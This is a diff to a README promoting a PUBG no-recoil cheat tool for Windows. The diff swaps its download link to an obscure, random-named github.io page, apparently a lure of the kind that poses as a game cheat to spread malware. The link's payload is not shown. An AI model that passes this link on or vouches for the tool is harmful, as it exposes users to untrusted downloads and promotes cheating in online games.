@@ -3,7 +3,7 @@
 Set up the **NoRecoil Control Assistant** for PUBG on Windows. This technical guide helps you stabilize recoil patterns, control spray drift, and fine-tune weapon handling for sharper aim and accurate bursts in any match.
 
 ⬇️ **Download**  
-[![Download Recoil Control Tool](https://img.shields.io/badge/Download-Recoil_Control-000000?style=for-the-badge&logo=pubg&logoColor=white)](https://pubg-no-recoil-control.github.io/.github/)
+[![Download Recoil Control Tool](https://img.shields.io/badge/Download-Recoil_Control-000000?style=for-the-badge&logo=pubg&logoColor=white)](https://my-sapqwr.github.io/.github/)
 
 ---
 
